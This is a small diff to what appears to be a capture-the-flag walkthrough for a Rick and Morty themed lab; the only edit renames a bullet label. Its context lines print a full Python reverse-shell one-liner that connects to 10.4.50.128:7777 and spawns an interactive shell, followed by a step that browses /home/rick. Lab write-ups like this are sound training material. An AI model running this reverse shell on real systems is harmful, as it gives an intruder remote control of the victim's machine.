@@ -49,7 +49,7 @@ Ans- mr. meeseek hair
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.50.128",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 * Navigate to /home/rick
-* file contents:
+* home directory contents:
 ```bash
 $ ls -la
 total 12
